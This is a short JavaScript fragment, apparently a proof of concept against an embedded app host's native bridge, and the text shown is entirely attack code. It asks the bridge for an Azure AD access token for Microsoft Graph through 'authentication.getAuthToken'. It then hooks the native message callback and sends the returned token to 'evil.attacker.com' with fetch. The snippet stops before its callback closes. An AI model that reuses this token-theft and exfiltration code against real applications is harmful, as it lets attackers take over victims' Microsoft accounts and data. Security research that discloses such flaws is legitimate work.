nativeInterface.framelessPostMessage(JSON.stringify({
  id: "tok1",
  func: "authentication.getAuthToken",
  args: [["https://graph.microsoft.com"]]
}));
// Response arrives via window.onNativeMessage callback with the AAD token
window.onNativeMessage = function(event) {
  // Send event.data to attacker server
  fetch('https://evil.attacker.com/collect?token=' + encodeURIComponent(JSON.stringify(event.data)));
